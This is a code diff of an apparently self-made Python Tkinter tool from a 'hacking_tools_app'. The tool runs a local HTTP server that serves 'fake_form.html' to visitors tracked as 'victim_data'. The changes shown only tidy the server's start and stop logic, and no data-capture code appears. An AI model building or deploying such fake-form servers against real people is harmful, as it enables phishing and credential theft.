@@ -1,15 +1,12 @@
 import http.server
-import socketserver
-import os
 import threading
 import tkinter as tk
 import urllib.parse
 from tkinter import messagebox
 from http.server import SimpleHTTPRequestHandler, HTTPServer
-import subprocess
+import socket
 
 # Ruta absoluta al archivo form.html
-#FORM_FILE_PATH = "/home/jonathan/Desktop/hacking_tools_app/utils/fake_form.html"
 DIRECTORY = '/home/jonathan/Desktop/hacking_tools_app/utils'
 
 # Variable global para manejar el servidor
@@ -19,25 +16,7 @@ hilo = None  # Variable global para el hilo
 
 victim_data=None
 
-server_running = False  # Bandera para controlar el servidor
-
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
-    # def do_GET(self):
-    #     """Sirve directamente el archivo fake_form.html."""
-    #     if self.path == "/":  # Redirige la raíz al archivo form.html
-    #         self.path = FORM_FILE_PATH
-    #     try:
-    #         # Asegúrate de usar la ruta absoluta
-    #         with open(self.path, "rb") as file:
-    #             self.send_response(200)
-    #             self.send_header("Content-type", "text/html")
-    #             self.end_headers()
-    #             self.wfile.write(file.read())
-    #     except FileNotFoundError:
-    #         self.send_error(404, "Archivo no encontrado")
-    #     except Exception as e:
-    #         self.send_error(500, f"Error interno: {e}")
-
     def do_GET(self):
         if self.path == '/':
             self.path = '/fake_form.html'
@@ -71,7 +50,7 @@ def actualizar_consola_http_server(server_entry):
 
 def start_http_server_en_hilo(server_entry):
     """Inicia el servidor HTTP en un hilo separado."""
-    global httpd, hilo, server_running
+    global httpd, hilo
 
     def start_http_server():
         global httpd
@@ -92,23 +71,22 @@ def start_http_server_en_hilo(server_entry):
         httpd.timeout = 1  # Configura un tiempo de espera para las conexiones
         httpd.serve_forever()
 
-        # server_running = True
-        # while server_running:
-        #     httpd.handle_request()
-
 
     hilo = threading.Thread(target=start_http_server)
     hilo.daemon = True  # Permite que el hilo se detenga al cerrar la aplicación
     hilo.start()
 
 def stop_http_server(server_entry):
-    global httpd, hilo, server_running
+    global httpd
     if httpd:
         server_entry.insert(tk.END, "Deteniendo el servidor...\n")
-        httpd.shutdown()
-        hilo.join()  # Esperar a que el hilo del servidor termine
+        try:
+            httpd.socket.shutdown(socket.SHUT_RDWR)
+        except OSError:
+            pass  # El socket ya podría estar cerrado
         httpd.server_close()
         httpd = None
         server_entry.insert(tk.END, "Servidor detenido.\n")
     else:
         server_entry.insert(tk.END, "El servidor no está en ejecución.\n")
+
